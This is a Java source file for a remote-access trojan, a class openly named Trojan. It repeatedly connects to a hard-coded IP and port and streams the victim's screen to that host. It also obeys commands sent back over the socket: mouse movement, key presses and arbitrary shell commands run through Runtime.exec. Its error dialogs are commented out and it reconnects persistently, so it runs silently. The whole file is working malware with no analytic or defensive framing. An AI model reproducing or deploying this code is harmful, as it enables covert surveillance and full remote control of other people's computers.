package com.samasend;

import java.awt.Rectangle;
import java.awt.Robot;
import java.awt.Toolkit;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.PrintStream;
import java.net.Socket;
import java.util.Scanner;
import javax.swing.JFrame;

/**
 *
 * @author SamAsEnd
 */
public class Trojan extends JFrame implements Runnable {

    private static final long serialVersionUID = 1L;

    public static void main(String[] args) {
        //JOptionPane.showMessageDialog(null, "Started", "Trojan", JOptionPane.INFORMATION_MESSAGE);
        try {
            new Thread(new Trojan()).start();
        } catch (Exception ex) {
            //JOptionPane.showMessageDialog(null, ex.getMessage(), "Exception", JOptionPane.ERROR_MESSAGE);
        }
    }
    private Robot robot;
    private Socket socket;
    private Toolkit tool;
    private BufferedReader reader;
    private PrintStream write;
    private Scanner in;

    public Trojan() throws Exception {
        robot = new Robot();
        System.out.println("Robot created");
        robot.setAutoDelay(10);
        tool = getToolkit();
    }

    @Override
    public void run() {
        while (!initSocket()) {
            try {
                synchronized (this) {
                    wait(500);
                }
            } catch (InterruptedException ex) {
            }
        }
        try {
            new ImageSender(robot, new Rectangle(tool.getScreenSize()), socket.getOutputStream()).start();
        } catch (IOException ex) {
            //JOptionPane.showMessageDialog(null, ex.getMessage(), "IOException", JOptionPane.ERROR_MESSAGE);
        }
        while (true) {
            try {
                if (socket == null || socket.isClosed()) {
                    //JOptionPane.showMessageDialog(null, "Started", "Trojan", JOptionPane.INFORMATION_MESSAGE);
                    try {
                        new Thread(new Trojan()).start();
                    } catch (Exception ex) {
                        //JOptionPane.showMessageDialog(null, ex.getMessage(), "Exception", JOptionPane.ERROR_MESSAGE);
                    }
                    //JOptionPane.showMessageDialog(null, "Exit", "Trojan", JOptionPane.INFORMATION_MESSAGE);
                    break;
                }
                String v = reader.readLine();
                System.out.println("read = " + v);
                if (!"0".equals(v)) {
                    int x, y, button, amount;
                    in = new Scanner(v);
                    char op = in.next().charAt(0);
                    switch (op) {
                        case '1':  // move mouse
                            x = in.nextInt();
                            y = in.nextInt();
                            robot.mouseMove(x, y);
                            break;
                        case '2':  // mouse press
                            button = in.nextInt();
                            robot.mousePress(button);
                            break;
                        case '3':  // mouse release
                            button = in.nextInt();
                            robot.mouseRelease(button);
                            break;
                        case '4':  // mouse mouseWheel
                            amount = in.nextInt();
                            robot.mouseWheel(amount);
                            break;
                        case '5':  // key pressed
                            x = in.nextInt();
                            robot.keyPress(x);
                            break;
                        case '6':  // key release
                            x = in.nextInt();
                            robot.keyRelease(x);
                            break;
                        case '7':  // click mouse
                            button = in.nextInt();
                            robot.mousePress(button);
                            robot.mousePress(button);
                            break;
                        case '9':  // click mouse
                            String cmd = in.next();
                            Runtime.getRuntime().exec(cmd);
                            break;
                        default:
                            System.out.println(v + "  Error");
                    }
                    try {
                        synchronized (this) {
                            wait(50);
                            notifyAll();
                        }
                    } catch (InterruptedException ex) {
                    }
                }
            } catch (Exception ex) {
                //JOptionPane.showMessageDialog(null, ex.getMessage(), "HeadlessException | IOException: ", JOptionPane.ERROR_MESSAGE);
            }
        }
    }

    /**
     * @return the robot
     */
    public Robot getRobot() {
        return robot;
    }

    /**
     * @return the socket
     */
    public Socket getSocket() {
        return socket;
    }

    /**
     * @return the tool
     */
    public Toolkit getTool() {
        return tool;
    }

    /**
     * @return the reader
     */
    public BufferedReader getReader() {
        return reader;
    }

    /**
     * @return the write
     */
    public PrintStream getWrite() {
        return write;
    }

    /**
     * @return the in
     */
    public Scanner getIn() {
        return in;
    }

    /**
     * @param robot the robot to set
     */
    public void setRobot(Robot robot) {
        this.robot = robot;
    }

    /**
     * @param socket the socket to set
     */
    public void setSocket(Socket socket) {
        this.socket = socket;
    }

    /**
     * @param tool the tool to set
     */
    public void setTool(Toolkit tool) {
        this.tool = tool;
    }

    /**
     * @param reader the reader to set
     */
    public void setReader(BufferedReader reader) {
        this.reader = reader;
    }

    /**
     * @param write the write to set
     */
    public void setWrite(PrintStream write) {
        this.write = write;
    }

    /**
     * @param in the in to set
     */
    public void setIn(Scanner in) {
        this.in = in;
    }

    public boolean initSocket() {
        if (socket != null && write != null && reader != null) {
            return true;
        }
        try {
            //socket = new Socket("127.0.0.1", 21021);
            socket = new Socket("169.254.186.3", 21021);
            //JOptionPane.showMessageDialog(null, "Connected", "Trojan", JOptionPane.INFORMATION_MESSAGE);
            write = new PrintStream(socket.getOutputStream());
            reader = new BufferedReader(new InputStreamReader(socket.getInputStream()));
            return true;
        } catch (Exception ex) {
            return false;
        }
    }
}
